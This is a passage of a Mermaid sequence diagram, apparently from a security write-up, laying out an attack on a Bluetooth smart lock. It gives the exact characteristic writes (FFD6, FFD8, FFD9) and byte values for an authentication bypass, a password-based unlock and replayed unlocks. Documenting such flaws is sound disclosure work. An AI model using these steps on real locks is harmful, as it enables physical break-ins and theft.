...
sequenceDiagram
    ...
    A->>L: Write to FFD8 (0x03)<br/>Skip authentication test
    L-->>A: Write Accepted
    
    A->>L: Write to FFD9 (0x01)<br/>Unlock without password
    L-->>A: 🔓 UNLOCKED
    
    Note right of L: 🚨 CRITICAL: Auth bypass!

    Note over A,L: Exploitation Phase
    A->>L: Write FFD6: 00 12 34 56 78 00 00 00 00<br/>Send password
    L-->>A: FFD7 Notification: 01 FF<br/>Auth success
    
    A->>L: Write FFD8: 0x03<br/>Set open time
    A->>L: Write FFD9: 0x01<br/>Execute unlock
    L-->>A: Motor Activation
    
    Note right of L: ✓ Physical unlock achieved

    Note over A,U: Persistent Access Phase
    A->>L: Replay: FFD6 + FFD8 + FFD9<br/>Same credentials work indefinitely
    L-->>A: 🔓 Unlocked again
